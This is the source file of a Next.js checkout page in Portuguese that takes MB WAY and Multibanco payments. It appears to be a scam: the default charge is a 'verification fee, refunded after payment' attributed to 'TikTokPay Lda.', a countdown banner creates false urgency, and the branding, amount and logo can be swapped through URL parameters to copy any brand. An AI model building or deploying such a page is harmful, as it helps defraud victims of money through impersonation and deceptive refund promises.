import Head from 'next/head'
import { useEffect, useState } from 'react'

export default function Checkout() {
  const [params, setParams]     = useState({ name: 'Taxa de Verificação – Estorno após Pagamento', amount: 9.90, description: 'TikTokPay Lda.', logo: '', timer: 10 })
  const [method, setMethod]     = useState('mbway')
  const [phone, setPhone]       = useState('')
  const [terms, setTerms]       = useState(false)
  const [loading, setLoading]   = useState(false)
  const [error, setError]       = useState('')
  const [uiState, setUiState]   = useState('form') // form | mbway | multibanco | completed
  const [txData, setTxData]     = useState(null)
  const [countdown, setCountdown] = useState(600)

  // Read URL params on mount
  useEffect(() => {
    const p = new URLSearchParams(window.location.search)
    const timer = parseInt(p.get('timer') || '10', 10)
    setParams({
      name:        p.get('name')        || 'TikTok',
      amount:      parseFloat(p.get('amount') || '9.90'),
      description: p.get('description') || p.get('name') || 'TikTok',
      logo:        p.get('logo')        || '',
      timer,
    })
    setCountdown(timer * 60)
  }, [])

  // Countdown timer
  useEffect(() => {
    const t = setInterval(() => setCountdown(c => Math.max(0, c - 1)), 1000)
    return () => clearInterval(t)
  }, [])

  // Poll transaction status
  useEffect(() => {
    if (!txData?.id || (uiState !== 'mbway' && uiState !== 'multibanco')) return
    const t = setInterval(async () => {
      try {
        const r = await fetch('/api/transaction-info', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ id: txData.id }),
        })
        const d = await r.json()
        if (d.status === 'COMPLETED') { clearInterval(t); setUiState('completed') }
        if (d.status === 'DECLINED')  { clearInterval(t); setUiState('form'); setError('Pagamento recusado. Tenta novamente.') }
      } catch (_) {}
    }, 3000)
    return () => clearInterval(t)
  }, [txData, uiState])

  const fmtMin    = String(Math.floor(countdown / 60)).padStart(2, '0')
  const fmtSec    = String(countdown % 60).padStart(2, '0')
  const fmtAmount = `€ ${params.amount.toFixed(2).replace('.', ',')}`

  const formatPhone = raw => {
    let d = raw.replace(/\D/g, '').slice(0, 9)
    if (d.length > 6) d = d.slice(0, 3) + ' ' + d.slice(3, 6) + ' ' + d.slice(6)
    else if (d.length > 3) d = d.slice(0, 3) + ' ' + d.slice(3)
    return d
  }

  const handlePay = async () => {
    setError('')
    if (!terms) return setError('Por favor aceita os Termos e Condições para continuar.')
    if (method === 'mbway') {
      const clean = phone.replace(/\s/g, '')
      if (clean.length < 9) return setError('Introduz um número de telefone válido para MB WAY.')
    }
    setLoading(true)
    try {
      const res = await fetch('/api/create-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          amount:             params.amount,
          method,
          paymentDescription: params.name.slice(0, 50),
          currency:           'EUR',
          payer: {
            name:     params.name + ' Customer',
            email:    'customer@waymb.com',
            document: '000000000',
            phone:    method === 'mbway' ? '+351' + phone.replace(/\s/g, '') : '+351912345678',
          },
        }),
      })
      const data = await res.json()
      if (!res.ok) { setLoading(false); return setError(data?.message || data?.error || 'Erro ao criar transação.') }
      setTxData(data)
      setLoading(false)
      setUiState(method)
    } catch (e) {
      setLoading(false)
      setError('Erro de rede. Verifica a ligação e tenta novamente.')
    }
  }

  return (
    <>
      <Head>
        <title>Checkout • WayMB</title>
        <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no"/>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
      </Head>

      <style jsx global>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        html, body { min-height: 100%; background: #f2f2f2; font-family: 'Inter', sans-serif; color: #1a1a1a; -webkit-font-smoothing: antialiased; }
        
        .banner {
          position: fixed; top: 0; left: 0; right: 0; z-index: 100;
          background: #F0004F; color: #fff;
          text-align: center; font-size: .85rem; font-weight: 600;
          padding: .65rem 1rem; letter-spacing: .01em;
        }
        .page {
          padding: 3.6rem 1rem 2rem;
          max-width: 430px; margin: 0 auto;
          display: flex; flex-direction: column; gap: .85rem;
        }
        .card {
          background: #fff; border-radius: 16px;
          box-shadow: 0 2px 12px rgba(0,0,0,.08); overflow: hidden;
        }

        /* ── Product header card ── */
        .product-card {
          display: flex; flex-direction: column; align-items: center;
          padding: 1.5rem 1.25rem 1.25rem; text-align: center;
        }
        .product-logo {
          width: 64px;
          height: 64px;
          border-radius: 50%;
          background: #000;
          margin-bottom: 1rem;
          position: relative; /* Base para o posicionamento absoluto */
          overflow: hidden;
          flex-shrink: 0;
        }
        .product-logo img { 
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%); /* Centralização absoluta real */
          max-width: 80%; /* Garante que não encoste nas bordas */
          max-height: 80%;
          width: auto;
          height: auto;
          display: block;
          object-fit: contain;
        }
        .product-logo-letter { 
          position: absolute;
          top: 50%; left: 50%;
          transform: translate(-50%, -50%);
          color: #fff; font-size: 1.4rem; font-weight: 800; 
        }
        .product-name-header { font-size: 1.05rem; font-weight: 700; margin-bottom: .2rem; }
        .product-secure { font-size: .78rem; color: #888; font-weight: 400; }

        /* ── Resto dos estilos ── */
        .payment-card { padding: 1.25rem; }
        .payment-title { font-size: .95rem; font-weight: 700; margin-bottom: .1rem; }
        .payment-sub   { font-size: .78rem; color: #888; margin-bottom: 1rem; }
        .total-box {
          background: #f7f7f7; border-radius: 10px;
          padding: .85rem 1rem; text-align: center; margin-bottom: 1rem;
        }
        .total-label { font-size: .75rem; color: #888; margin-bottom: .25rem; }
        .total-value { font-size: 1.65rem; font-weight: 700; color: #F0004F; letter-spacing: -.02em; }
        .method-tabs { display: flex; gap: .5rem; margin-bottom: 1rem; }
        .method-tab {
          flex: 1; padding: .65rem .5rem;
          border-radius: 8px; font-size: .85rem; font-weight: 600;
          cursor: pointer; border: 1.5px solid #e8e8e8;
          background: transparent; color: #888;
          font-family: 'Inter', sans-serif;
          transition: all .15s; text-align: center;
        }
        .method-tab.active { background: #F0004F; border-color: #F0004F; color: #fff; }
        .phone-group {
          display: flex; border: 1.5px solid #d8d8d8;
          border-radius: 10px; overflow: hidden;
          margin-bottom: 1rem;
        }
        .phone-prefix {
          display: flex; align-items: center; gap: .4rem;
          padding: .75rem .9rem; border-right: 1.5px solid #d8d8d8;
          font-size: .88rem; font-weight: 500; background: #fafafa;
        }
        .phone-input {
          flex: 1; border: none; outline: none;
          padding: .75rem .9rem; font-size: .88rem;
          font-family: 'Inter', sans-serif; color: #1a1a1a;
        }
        .terms-wrap {
          display: flex; align-items: center; gap: .6rem;
          border: 1.5px solid #e8e8e8; border-radius: 10px;
          padding: .75rem .9rem; margin-bottom: 1rem;
          cursor: pointer; font-size: .82rem; color: #888;
        }
        .error-msg {
          background: rgba(240,0,79,.08); border: 1px solid rgba(240,0,79,.2);
          border-radius: 8px; color: #F0004F; font-size: .78rem; padding: .6rem .85rem; margin-bottom: .85rem;
        }
        .btn-pay {
          width: 100%; padding: .9rem; border-radius: 50px;
          background: #F0004F; border: none; color: #fff;
          font-size: .95rem; font-weight: 700; cursor: pointer;
          display: flex; align-items: center; justify-content: center; gap: .5rem;
        }
        .success-box {
          display: flex; flex-direction: column; align-items: center; justify-content: center;
          text-align: center; padding: 1.25rem 1rem 1rem;
        }
        .polling { display: flex; align-items: center; justify-content: center; gap: .4rem; padding-top: .85rem; }
        .dot { width: 6px; height: 6px; border-radius: 50%; background: #aaa; animation: pulse 1.2s ease-in-out infinite; }
        @keyframes pulse { 0%,100%{opacity:.25} 50%{opacity:1} }
        .spinner { width: 18px; height: 18px; border: 2px solid rgba(255,255,255,.35); border-top-color: #fff; border-radius: 50%; animation: spin .65s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>

      <div className="banner">
        ⏰ Oferta expira em {fmtMin}:{fmtSec}
      </div>

      <div className="page">
        {/* PRODUCT HEADER CARD CORRIGIDO */}
        <div className="card product-card">
          <div className="product-logo">
            { (params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif") ? (
              <img 
                src={params.logo || "https://i.postimg.cc/L4fzn491/7safpbsxoywisudmovpfonxnj.gif"} 
                alt={params.name} 
                onError={(e) => { e.target.style.display = 'none'; }}
              />
            ) : (
              <span className="product-logo-letter">{params.name.charAt(0).toUpperCase()}</span>
            )}
          </div>
          <div className="product-name-header">{params.name}</div>
          <div className="product-secure">Pagamento seguro • WayMB</div>
        </div>

        {/* PAYMENT CARD */}
        <div className="card payment-card">
          <div className="payment-title">{params.name}</div>
          <div className="payment-sub">{params.description}</div>

          <div className="total-box">
            <div className="total-label">Total a pagar</div>
            <div className="total-value">{fmtAmount}</div>
          </div>

          {uiState === 'form' && (
            <>
              <div className="method-tabs">
                <button className={`method-tab${method === 'mbway' ? ' active' : ''}`} onClick={() => setMethod('mbway')}>MB WAY</button>
                <button className={`method-tab${method === 'multibanco' ? ' active' : ''}`} onClick={() => setMethod('multibanco')}>Multibanco</button>
              </div>

              {method === 'mbway' && (
                <div className="phone-group">
                  <div className="phone-prefix">🇵🇹 +351</div>
                  <input className="phone-input" type="tel" placeholder="912 345 678" value={phone} onChange={e => setPhone(formatPhone(e.target.value))} />
                </div>
              )}

              <label className="terms-wrap">
                <input style={{width:'18px',height:'18px',accentColor:'#F0004F'}} type="checkbox" checked={terms} onChange={e => setTerms(e.target.checked)} />
                <span style={{fontSize:'.82rem',color:'#888',marginLeft:'.6rem'}}>Li e aceito os <span style={{color:'#F0004F',fontWeight:'500'}}>Termos e Condições</span></span>
              </label>

              {error && <div className="error-msg">{error}</div>}

              <button className="btn-pay" onClick={handlePay} disabled={loading}>
                {loading ? <><div className="spinner"/><span>A processar...</span></> : 'Pagar agora'}
              </button>
            </>
          )}

          {uiState === 'mbway' && (
            <div className="success-box">
              <div className="success-title" style={{fontWeight:700}}>Aprove no MB WAY</div>
              <div className="success-amount" style={{color:'#F0004F',fontSize:'1.1rem',margin:'.5rem 0 1rem'}}>{fmtAmount}</div>
              <MbwayLogo/>
              <div className="polling">
                <div className="dot"/><div className="dot"/><div className="dot"/>
                <span style={{fontSize:'.78rem',color:'#888',marginLeft:'.3rem'}}>A aguardar confirmação...</span>
              </div>
            </div>
          )}

          {uiState === 'multibanco' && (
            <div className="success-box">
              <div className="success-title" style={{fontWeight:700}}>Pagamento Multibanco</div>
              <div className="mb-info">
                Entidade: <strong>{txData?.referenceData?.entity || '—'}</strong><br/>
                Referência: <strong>{txData?.referenceData?.reference || '—'}</strong><br/>
                Valor: <span style={{color:'#F0004F',fontWeight:700}}>{fmtAmount}</span>
              </div>
              <MultibancoLogo/>
            </div>
          )}

          {uiState === 'completed' && (
            <div className="success-box">
              <div style={{width:'56px',height:'56px',borderRadius:'50%',background:'rgba(34,197,94,.12)',display:'flex',alignItems:'center',justifyContent:'center',marginBottom:'1rem'}}>
                <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#22c55e" strokeWidth="2.5"><polyline points="20 6 9 17 4 12"/></svg>
              </div>
              <div style={{fontSize:'1rem',fontWeight:700,marginBottom:'.3rem'}}>Pagamento confirmado!</div>
              <div style={{fontSize:'.82rem',color:'#888'}}>O teu pagamento foi recebido com sucesso.</div>
            </div>
          )}
        </div>
      </div>
    </>
  )
}

function MbwayLogo() {
  return (
    <div style={{ margin: '1rem 0', display: 'flex', justifyContent: 'center' }}>
      <img src="https://i.postimg.cc/wj062NVq/mbway2.png" alt="MB WAY" style={{ width: '140px', height: 'auto' }} />
    </div>
  )
}

function MultibancoLogo() {
  return (
    <div style={{ margin: '1rem 0', display: 'flex', justifyContent: 'center' }}>
      <img src="https://i.postimg.cc/Pq7dsk9c/multibanco2.png" alt="Multibanco" style={{ width: '100px', height: 'auto' }} />
    </div>
  )
}
